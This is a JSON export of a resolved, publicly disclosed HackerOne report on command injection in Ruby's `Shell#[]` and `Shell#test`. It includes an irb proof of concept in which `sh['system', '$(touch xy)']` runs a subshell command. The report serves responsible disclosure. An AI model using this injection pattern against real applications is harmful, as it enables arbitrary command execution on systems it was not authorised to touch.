{
  "id": 327512,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjc1MTI=",
  "url": "https://hackerone.com/reports/327512",
  "title": "Potential command injection in `Shell#[]` and `Shell#test`",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "none",
  "readable_substate": "Resolved",
  "created_at": "2018-03-19T20:33:10.989Z",
  "submitted_at": "2018-03-19T20:33:10.989Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ooooooo_q",
    "url": "/ooooooo_q",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/20fc426031f09e5347054871ae4e3af2478fd2b3d5e8a321468ecf6f2da5ac20"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 7724,
    "url": "https://hackerone.com/ruby",
    "handle": "ruby",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Ruby",
      "twitter_handle": "",
      "website": "https://www.ruby-lang.org",
      "about": "A Programmer's Best Friend"
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-10-16T23:15:28.407Z",
  "bug_reporter_agreed_on_going_public_at": "2019-10-16T23:15:28.314Z",
  "team_member_agreed_on_going_public_at": "2019-10-16T23:10:46.538Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "As `Shell#test` and `Shell#[]` use `send` when transferring to FileTest, private methods etc. can also be called. Therefore, command injection is possible when a crafted value is passed.\n\n```ruby\n$ irb\nirb(main):001:0> `ls xy`\nls: xy: No such file or directory\n=> \"\"\n\nirb(main):002:0> require 'shell'\n=> true\nirb(main):003:0> sh = Shell.new\n=> #<Shell:0x00007fc0c20f2a78>\nirb(main):004:0> sh['system', '$(touch xy)']\nsh: /private/tmp/: is a directory\n=> false\n\nirb(main):005:0> `ls xy`\n=> \"xy\\n\"\n```\n\nSince send is executed after the file path is converted to absolute path, it is difficult with `instance_eval` and `open` etc, but you can execute it using a subshell.\n\n## Impact\n\nIt seems almost unlikely that user input is given for the purpose, so it probably will not be affected in most cases.\nIt may be feasible under complex conditions such as combining object injection and other problems.",
  "bounty_amount": "200.0",
  "formatted_bounty": "$200",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-11-15T23:10:46.642Z",
  "allow_singular_disclosure_after": -184603990.57507142,
  "singular_disclosure_allowed": true,
  "vote_count": 1,
  "voters": [
    "bl4de"
  ],
  "severity": {
    "rating": "none",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
